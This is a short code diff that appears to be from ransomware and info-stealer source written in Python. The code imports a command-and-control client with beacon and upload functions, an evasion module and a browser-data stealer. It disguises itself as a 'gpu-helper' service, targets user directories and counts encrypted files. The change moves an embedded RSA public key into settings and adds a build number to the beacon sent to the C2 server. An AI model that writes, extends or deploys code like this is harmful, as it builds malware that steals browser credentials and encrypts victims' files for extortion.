@@ -31,23 +31,12 @@ from lib.c2_client import get_system_info, send_beacon, upload_file
 from lib.evasion import run_evasion
 from lib.browser_stealer import steal_all as steal_browser_data
 
-from settings import C2_SERVER, TRAFFIC_KEY
+from settings import C2_SERVER, TRAFFIC_KEY, PUBLIC_KEY_PEM, BUILD_NUMBER
 
 SERVICE_NAME = "gpu-helper"
 EXE_PATH = os.path.abspath(sys.argv[0])
 
 TARGET_DIRS = ['C:\\Users']
-
-PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAns1svXkshhK10q2seiTF
-kH8zF38750Doixr1lfppHL64b5xvCtES8g574vXEvq0iYGUSztZ7qPkmCGrX45SR
-Im0mg6rEyX0/X0E6ZRaTmZqJYfUCXklR4ASxkibx3tQl6qU/YpnmIlN455a7Etjx
-egNTfDgxN8+ZI48JFfkRXnOpjXzvlaPzNxkuN/vtdBATc8MPIr77FqdF7sp7ABw0
-nV+sOWrMzuisTPevusTw+VFowsEd0TRNXJWi2qQrZi1A3AfxNw/mGoHk/zhG2qtk
-/r+pkDm8Tds3/RBicyAomNyo3Tlu/f4iTBtynjZAVhhBR1Sv55/u6iBcydOW7aVd
-6wIDAQAB
------END PUBLIC KEY-----
-"""
 
 BEACON_INTERVAL = 60
 
@@ -315,6 +304,7 @@ def beacon_loop():
     info['type'] = 'installer'
     info['architecture'] = platform.machine()
     info['version'] = '1.0'
+    info['build_number'] = BUILD_NUMBER
     status = "waiting"
     files_encrypted = 0
     last_result = None
